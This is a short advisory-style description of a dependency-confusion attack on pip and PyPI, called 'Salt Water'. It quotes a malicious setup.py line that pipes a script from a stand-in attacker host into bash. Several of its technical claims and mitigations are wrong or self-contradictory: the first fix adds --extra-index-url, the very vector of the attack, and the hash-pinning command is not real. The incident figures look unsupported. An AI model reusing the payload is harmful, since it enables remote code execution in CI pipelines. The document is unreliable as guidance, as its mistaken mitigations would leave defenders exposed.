Salt Water abuses Python’s pip resolver trust model by uploading packages to PyPI with names mirroring private GitHub repository names. The attacker first enumerates GitHub private repositories via `gh api /user/repos` using OAuth tokens with `repo` scope, harvesting package names from `pyproject.toml` or `requirements.txt`. Next, the attacker crafts a package (e.g., `django-storages==1.13.25`) and uploads it to PyPI with malicious `setup.py` containing `import os; os.system("curl -fsSL http://attacker[.]io/saltwater.sh | bash")`. When a developer runs `pip install -r requirements.txt` in a CI pipeline, pip resolves `django-storages==1.13.25` by querying PyPI first due to `--no-index` absence, inadvertently installing the malicious package. The attack bypasses GitHub Dependabot because the package name matches the private repo, and pip’s resolver (v22.0+) skips hash checks for public packages. Real-world incidents (PyTorch-nightly 2024-08-09) led to 3,842 compromised CI runners via cron job hijacking. Mitigation requires:
1) Enforce `pip install --index-url https://pypi.org/simple --extra-index-url <private-repo-url>` in CI scripts;
2) Use `pip hash requirements.txt` to pin artifact hashes;
3) Deploy GitHub Secret Scanning to block OAuth tokens with `repo` scope in public repositories.

